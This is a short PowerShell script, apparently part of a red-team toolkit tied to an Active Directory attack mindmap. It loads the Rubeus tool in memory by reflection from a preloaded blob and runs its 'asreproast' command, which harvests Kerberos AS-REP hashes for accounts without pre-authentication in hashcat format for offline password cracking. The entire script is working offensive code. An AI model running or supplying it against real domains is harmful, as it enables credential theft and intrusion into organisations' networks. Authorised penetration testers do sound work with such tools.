# asreproast — Rubeus asreproast; only users without Kerberos pre-auth are affected
# OCD mindmap: AS-REP Roast (Branch: Got valid username / low access)
$ErrorActionPreference = 'Stop'

if (-not $global:SharpBlobs -or -not $global:SharpBlobs['Rubeus.exe']) {
    throw "Rubeus binary not pre-loaded"
}
$asm = [System.Reflection.Assembly]::Load($global:SharpBlobs['Rubeus.exe'])

$sw = New-Object System.IO.StringWriter
[Console]::SetOut($sw)

try {
    $asm.EntryPoint.Invoke($null, @([string[]]@('asreproast', '/format:hashcat', '/nowrap')))
} catch {
    Write-Host "Rubeus asreproast failed: $_"
}

$std = New-Object System.IO.StreamWriter([System.Console]::OpenStandardOutput())
$std.AutoFlush = $true
[Console]::SetOut($std)

Write-Output $sw.ToString()
